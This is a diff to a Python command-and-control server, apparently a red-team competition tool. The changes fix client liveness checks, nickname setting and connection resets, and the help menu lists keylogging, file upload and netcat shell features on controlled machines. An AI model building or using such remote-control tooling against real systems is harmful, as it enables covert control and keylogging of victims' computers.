@@ -34,12 +34,8 @@ class Team():
     def listClients(self):
         print("> Team " + self.identity + ":")
         for client in self.clients:
-            try: #Try to see if the client is still alive, if they are, print them. If not, skip them.
-                client.getSocket().send("whoami".encode())
-                client.getSocket().recv(BUFFER_SIZE)
+            if client.isUp():
                 print("    >> " + client.getNick())
-            except:
-                pass
 
 class Service():
 
@@ -111,14 +107,14 @@ class Service():
     def listClients(self):
         print("Active Clients: ")
         for client in self.clients:
-            print("\t" + str(client.IP))
+            if client.isUp():
+                print("\t" + str(client.IP))
+            else:
+                print("Connection lost to: " + str(client.IP))
 
     def assign(self, client):
         self.clients.append(client) #Append the client to the clients list
         client.setService(self)
-
-    #TODO Each service has stored commands to break it
-    pass
 
 class Connection:
     def __init__(self, addr, socket):
@@ -172,6 +168,17 @@ class Connection:
     def receiveResp(self):
         print("\tClient (" + str(self.addr[0]) + ") response: '" + str(self.socket.recv(BUFFER_SIZE).decode()).strip() + "'")
         return
+    
+    #returns true if client is up
+    def isUp(self):
+        try:
+            if self.sendCommand("whoami") != None: #send whoami and if the response doesn't exist, it's not up
+                return True
+            return False
+        except:
+            return False
+        
+
         
 #DEFAULT VALUES
 SERVER_ADDR = "127.0.0.1"
@@ -217,7 +224,6 @@ def selectClient():
         return
     for client in selectedTeam.clients:
         print(f"{i} - {str(client.IP)}")
-        #TODO FIX THIS FUNCTION TO SELECT A CLIENT FROM A TEAM
         i += 1
     while not selectedClient:
         try:
@@ -227,7 +233,7 @@ def selectClient():
             selectedClient = selectedTeam.clients[int(x)]
         except:
             pass
-    client_console(client)
+    client_console(selectedClient)
 
 
 #Start server and listen for new connections
@@ -416,7 +422,7 @@ def list_clients():
             client.send(str.encode('whoami'))
             whoami = client.recv(201480).decode()
             whoami = whoami.strip()
-            if cwd is None:
+            if cwd is None or cwd == "":
                 CURRENT_CONNECTIONS.remove(i)
                 CURRENT_ADDRESSES.remove(i)
         except:
@@ -523,7 +529,7 @@ def client_console(client): #previously took in cmd
                 print("Netcat is being hosted on: " + client.IP + ":" + clientSock.socket.recv(BUFFER_SIZE).decode())
             elif "setnick" in newCMD.lower():
                 newCMD.replace("setnick","")
-                clientSock.setNickName(newCMD)
+                client.setNickName(newCMD)
             elif "reset" in newCMD.lower():
                 connection.socket.send("reset_connection".encode())
             elif "help" in newCMD: #Help menu
@@ -536,6 +542,7 @@ def client_console(client): #previously took in cmd
                     \n\tUse 'ul' to upload a file.\
                     \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                     \n\tUse 'ncport' to get the port the shell is listening on.\
+                    \n\tUse 'setnick' to set the nickname of the machine.\
                     \n\tUse 'tty' to start a new TTY in netcat.\n")
             elif "exit" in newCMD:
                 break
@@ -660,7 +667,10 @@ def startTTY(IP):
 #Disconnect all clients and end sockets - UPDATED TO RESET CONNECTION TO KEEP ALIVE
 def shutdown_clients():
     for conn in CURRENT_CONNECTIONS:
-        conn.send("reset_connection".encode())
+        try:
+            conn.send("reset_connection".encode())
+        except:
+            continue
 
 def createService(service,identifier):
     if service not in SERVICES:
